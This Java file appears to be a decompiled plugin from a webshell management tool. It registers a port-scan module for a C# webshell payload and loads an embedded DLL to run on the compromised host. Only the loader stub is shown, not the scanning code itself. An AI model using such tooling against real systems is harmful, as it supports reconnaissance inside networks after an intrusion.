package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.PortScan;
import util.functions;

@PluginAnnotation(
   payloadName = "CShapDynamicPayload",
   Name = "PortScan",
   DisplayName = "端口扫描"
)
public class CPortScan extends PortScan {
   private static final String CLASS_NAME = "CProtScan.Run";

   public byte[] readPlugin() throws IOException {
      InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.dll", "CProtScan.Run".substring(0, "CProtScan.Run".indexOf("."))));
      return functions.readInputStreamAutoClose(inputStream);
   }

   public String getClassName() {
      return "CProtScan.Run";
   }
}
